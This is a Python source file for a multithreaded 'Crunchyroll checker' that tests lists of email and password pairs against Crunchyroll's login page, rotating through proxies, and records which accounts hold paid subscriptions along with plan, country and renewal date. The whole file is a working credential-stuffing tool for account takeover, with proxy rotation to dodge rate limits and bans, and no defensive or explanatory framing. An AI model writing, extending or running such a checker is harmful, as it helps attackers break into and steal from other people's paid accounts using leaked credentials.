import requests
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import config

class CrunchyrollChecker:
    def __init__(self, proxies=None, threads=10):
        self.proxies = proxies or []
        self.threads = threads
        self.results = []
        self.hits = []
        self.proxy_index = 0
        self.proxy_lock = Lock()
        self.results_lock = Lock()
        self.total_checked = 0
        self.total_hits = 0
        self.progress_callback = None
    
    def set_progress_callback(self, callback):
        self.progress_callback = callback
    
    def parse_proxy(self, proxy_str):
        try:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                server, port, user, password = parts
                return {'http': f"http://{user}:{password}@{server}:{port}", 
                       'https': f"http://{user}:{password}@{server}:{port}"}
            elif len(parts) == 2:
                server, port = parts
                return {'http': f"http://{server}:{port}", 
                       'https': f"http://{server}:{port}"}
        except:
            pass
        return None
    
    def get_next_proxy(self):
        if not self.proxies:
            return None
        with self.proxy_lock:
            proxy = self.proxies[self.proxy_index % len(self.proxies)]
            self.proxy_index += 1
            return proxy
    
    def is_valid_email(self, email):
        """Basic email validation"""
        if not email or '@' not in email:
            return False
        # Check if email has proper format
        parts = email.split('@')
        if len(parts) != 2:
            return False
        if len(parts[0]) < 1 or len(parts[1]) < 3:
            return False
        return True
    
    def check_account(self, email, password, proxy=None):
        result = {
            'email': email,
            'password': password,
            'success': False,
            'verified': False,
            'created': '',
            'plan': 'None',
            'active': False,
            'renewal': '',
            'country': 'Unknown',
            'error': ''
        }
        
        # Skip invalid email formats
        if not self.is_valid_email(email):
            result['error'] = "Invalid email format"
            return result
        
        proxies_dict = self.parse_proxy(proxy) if proxy else None
        session = requests.Session()
        
        try:
            # Step 1: Login to Crunchyroll
            login_url = "https://www.crunchyroll.com/authenticate"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            data = {
                'login_form[username]': email,
                'login_form[password]': password,
                'submit': 'Log in'
            }
            
            response = session.post(login_url, headers=headers, data=data, 
                                   proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
            
            # Crunchyroll returns 404 on successful login (weird but normal)
            if response.status_code in [200, 404]:
                # Step 2: Get account page to check premium status
                account_url = "https://www.crunchyroll.com/account"
                acc_response = session.get(account_url, headers=headers, 
                                          proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
                
                if acc_response.status_code == 200:
                    text = acc_response.text.lower()
                    
                    # Premium keywords that indicate paid subscription
                    premium_indicators = [
                        'mega fan', 'ultimate fan', 'fan member', 
                        'premium member', 'premium plan', 'membership'
                    ]
                    
                    # Check if ANY premium indicator exists
                    is_premium = any(indicator in text for indicator in premium_indicators)
                    
                    # Also check - if "upgrade to premium" is NOT present but "premium" IS present
                    has_upgrade = 'upgrade to premium' in text or 'upgrade now' in text
                    has_premium_word = 'premium' in text
                    
                    if is_premium or (has_premium_word and not has_upgrade):
                        result['success'] = True
                        result['active'] = True
                        
                        # Detect plan type
                        if 'ultimate fan' in text:
                            result['plan'] = 'Ultimate Fan'
                        elif 'mega fan' in text:
                            result['plan'] = 'Mega Fan'
                        elif 'fan' in text and 'mega' not in text:
                            result['plan'] = 'Fan'
                        else:
                            result['plan'] = 'Premium'
                        
                        # Extract country
                        country_match = re.search(r'"country":"([^"]+)"', acc_response.text)
                        if country_match:
                            result['country'] = country_match.group(1).upper()
                        
                        # Extract renewal date
                        date_patterns = [
                            r'renews on (\d{4}-\d{2}-\d{2})',
                            r'next renewal (\d{4}-\d{2}-\d{2})',
                            r'next billing date (\d{4}-\d{2}-\d{2})',
                            r'(\d{4}-\d{2}-\d{2})'
                        ]
                        for pattern in date_patterns:
                            date_match = re.search(pattern, text)
                            if date_match:
                                result['renewal'] = date_match.group(1)
                                break
                        
                        # Try to get email verification from account page
                        if 'verified' in text:
                            result['verified'] = True
                    else:
                        result['error'] = "Free account"
                else:
                    result['error'] = f"HTTP {acc_response.status_code}"
            else:
                result['error'] = "Invalid credentials"
                
        except requests.exceptions.Timeout:
            result['error'] = "Timeout"
        except requests.exceptions.ConnectionError:
            result['error'] = "Connection error"
        except Exception as e:
            result['error'] = f"Error: {str(e)[:30]}"
        
        return result
    
    def check_accounts(self, accounts):
        self.results = []
        self.hits = []
        self.total_checked = 0
        self.total_hits = 0
        
        def process(account):
            email, password = account
            proxy = self.get_next_proxy() if self.proxies else None
            result = self.check_account(email, password, proxy)
            
            with self.results_lock:
                self.total_checked += 1
                if result['success']:
                    self.total_hits += 1
                    self.hits.append(result)
                if self.progress_callback:
                    self.progress_callback(self.total_checked, len(accounts), result)
            
            return result
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(process, acc) for acc in accounts]
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        return self.results, self.hits